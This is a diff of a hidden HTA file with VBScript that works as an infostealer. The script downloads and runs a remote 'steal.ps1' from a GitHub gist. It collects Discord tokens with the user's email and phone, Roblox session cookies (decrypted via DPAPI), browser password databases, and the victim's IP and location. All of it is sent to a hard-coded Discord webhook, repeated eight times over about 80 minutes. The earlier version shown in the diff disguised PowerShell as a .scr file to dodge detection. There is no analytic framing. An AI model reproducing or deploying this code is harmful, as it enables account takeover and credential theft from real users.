@@ -1,62 +1,170 @@
-<html><head><title>.</title>
+<html>
+<head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
 <script language="VBScript">
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, GIST_URL, PC, USER
+Dim sh, fso, WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' ==========================================
-' PUT YOUR WEBHOOK AND GIST URL HERE
-' ==========================================
-WH = ""
-GIST_URL = "https://gist.githubusercontent.com/alexproisgamer-dotcom/607e9edddbab4ca67ebbfe0146767f06/raw/e6af6051649c4fc64df75ad2c13b21bd6d7faa91/update.ps1"
+' --- WEBHOOK ---
+WH = "https://discord.com/api/webhooks/1568351976972877926/u0AFPPLPFJOjDwiCVmJRWbe9ZtqUUzEC3rUjzyQfMeib4o3LkZcv82iDRTYBzKkW9I4n"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+
+' --- Initial Grab ---
+Call GrabTokens
+Call IP
+Call GrabRoblox
 
 ' --- Re-run grab chain 8x (every 10 min) ---
 Dim runCount
 For runCount = 1 To 8
     Call PostEmbed(":repeat: Re-grab " & runCount & "/8", "PC: " & PC & " | User: " & USER, 3447003)
-    Call RunGist
-    If runCount < 8 Then WScript.Sleep 600000 ' 10 minutes
+    Call GrabTokens
+    Call IP
+    Call GrabRoblox
+    If runCount < 8 Then Call SleepMinutes(10)
 Next
 
 window.close()
 
-Sub RunGist()
-    ' Fetch the PS1 from the Gist
+' --- IP Function ---
+Sub IP()
+    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://api.ipify.org/", False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    Dim ip : ip = xh.responseText
+    If Len(ip) < 7 Then Exit Sub
+    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    Dim ll : ll = Split(xh.responseText, vbLf)
+    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
+    Call PostEmbed(":dart: Target", info, 3447003)
+    Set xh = Nothing
+End Sub
+
+' --- GrabRoblox Function ---
+Sub GrabRoblox()
+    Dim paths(2)
+    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
+    paths(2) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+
+    Dim i, fp, raw
+    For i = 0 To 2
+        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
+    Next
+    If Len(fp) = 0 Then Exit Sub
+    raw = ReadFile(fp)
+    If Len(raw) < 50 Then Exit Sub
+
+    Dim cookie: cookie = ""
+    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
+    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
+        Dim sp: sp = InStr(raw, "CookiesData"":""")
+        If sp > 0 Then
+            sp = sp + 14
+            Dim ep: ep = InStr(sp, raw, """")
+            If ep > sp Then
+                Dim b64: b64 = Mid(raw, sp, ep - sp)
+                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
+            End If
+        End If
+    End If
+    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
+        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
+    End If
+    If Len(cookie) = 0 Then cookie = raw
+
+    cookie = Replace(cookie, vbCr, "")
+    cookie = Replace(cookie, vbLf, "")
+    cookie = Replace(cookie, vbTab, "")
+    cookie = Trim(cookie)
+    Dim sc: sc = InStr(cookie, ";")
+    If sc > 0 Then cookie = Left(cookie, sc - 1)
+    cookie = Trim(cookie)
+    Dim warn: warn = InStr(cookie, "_|WARNING")
+    If warn > 1 Then cookie = Mid(cookie, warn)
+
+    PostEmbed "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280
+    PostFile "cookie.txt", cookie
+End Sub
+
+' --- Sleep Functions ---
+Sub SleepSeconds(s)
+    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
+    sh.Run cmd, 0, True
+End Sub
+
+Sub SleepMinutes(m)
+    Call SleepSeconds(m * 60)
+End Sub
+
+' --- GrabTokens ---
+Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", GIST_URL, False
+    xh.Open "GET", "https://gist.githubusercontent.com/alexproisgamer-dotcom/c5d82d771d84ba31d053e1459a1c138f/raw/0fcf97c07d1018c6849ef05cffb28ef4961e180e/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
     If Len(pc) < 100 Then Exit Sub
     Set xh = Nothing
 
-    ' Save to temp
-    Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\u.ps1"
-    Dim f: Set f = fso.CreateTextFile(psf, True)
-    f.Write pc
-    f.Close
-    
-    ' Copy PowerShell to .scr to bypass process tree flags
-    Dim psexec : psexec = sh.ExpandEnvironmentStrings("%TEMP%") & "\p.scr"
-    Dim realPs : realPs = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\WindowsPowerShell\v1.0\powershell.exe"
-    fso.CopyFile realPs, psexec, True
-    
-    ' Run it silently
-    sh.Run """" & psexec & """ -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File """ & psf & """", 0, True
-    
-    ' Cleanup
+    Dim psf: psf = TmpFile("steal.ps1")
+    WriteFile psf, pc
+    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
     fso.DeleteFile psf, True
-    fso.DeleteFile psexec, True
+
+    Dim tf: tf = TmpFile("steal_result.txt")
+    If Not fso.FileExists(tf) Then Exit Sub
+    Dim raw: raw = ReadFile(tf)
+
+    If Len(raw) > 10 Then
+        Dim lines: lines = Split(raw, vbCrLf)
+        Dim l
+        For Each l In lines
+            If Len(l) > 10 Then
+                If Left(l, 8) = "DISCORD|" Then
+                    Dim p: p = Split(Mid(l, 9), "|")
+                    If UBound(p) >= 4 Then
+                        Dim info: info = "**User:** " & p(0) & vbCrLf
+                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
+                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
+                        If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
+                        info = info & "**Token:** " & p(4)
+                        Call PostEmbed(":gift: Discord Token", info, 5793266)
+                    End If
+                End If
+                If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
+                    Call PostEmbed(":cookie: Roblox Cookie", Mid(l, 8), 65280)
+                End If
+                If Left(l, 8) = "PASSWORD" Then
+                    Dim pw: pw = Split(l, "|")
+                    If UBound(pw) >= 4 Then
+                        Call PostEmbed(":key: Password DB", "Browser: " & pw(1) & " | Status: " & pw(2) & " | b64: " & Len(pw(4)) & " chars", 16776960)
+                        If Len(pw(4)) > 0 Then Call PostFile(pw(1) & "_logindata.b64", pw(4))
+                    End If
+                End If
+            End If
+        Next
+    End If
+    fso.DeleteFile tf, True
 End Sub
 
+' --- Utility Functions ---
+Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
+Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
+Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
+
+' --- PostEmbed (direct to discord) ---
 Sub PostEmbed(t, d, c)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
@@ -65,22 +173,48 @@ Sub PostEmbed(t, d, c)
     h.Open "POST", WH, False
     h.SetRequestHeader "Content-Type", "application/json"
     h.Send j
+    Set h = Nothing
 End Sub
 
+' --- PostFile (direct to discord) ---
+Sub PostFile(fn, ct)
+    Dim DQ: DQ = Chr(34)
+    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
+    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
+    h.Send bd
+    Set h = Nothing
+End Sub
+
+' --- DecryptDPAPI ---
+Function DecryptDPAPI(b64)
+    DecryptDPAPI = ""
+    Dim inf: inf = TmpFile("dpi.txt")
+    Dim outf: outf = TmpFile("dpo.txt")
+    fso.DeleteFile outf, True
+    WriteFile inf, b64
+    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
+    Dim psf: psf = TmpFile("dpapi.ps1")
+    WriteFile psf, ps
+    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
+    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
+    fso.DeleteFile inf, True
+    fso.DeleteFile psf, True
+    fso.DeleteFile outf, True
+End Function
+
+' --- Ej ---
 Function Ej(s)
-    Dim i, c, out
-    out = ""
-    For i = 1 To Len(s)
-        c = Asc(Mid(s, i, 1))
-        If c >= 32 Or c = 9 Or c = 10 Or c = 13 Then out = out & Mid(s, i, 1)
-    Next
-    out = Replace(out, Chr(92), Chr(92) & Chr(92))
-    out = Replace(out, Chr(34), Chr(92) & Chr(34))
-    out = Replace(out, vbCrLf, Chr(92) & "n")
-    out = Replace(out, vbCr, Chr(92) & "n")
-    out = Replace(out, vbLf, Chr(92) & "n")
-    out = Replace(out, vbTab, Chr(92) & "t")
-    Ej = out
+    Ej = s
+    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
+    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
+    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
+    Ej = Replace(Ej, vbCr, Chr(92) & "n")
+    Ej = Replace(Ej, vbLf, Chr(92) & "n")
+    Ej = Replace(Ej, vbTab, Chr(92) & "t")
 End Function
 </script>
 </head><body></body></html>
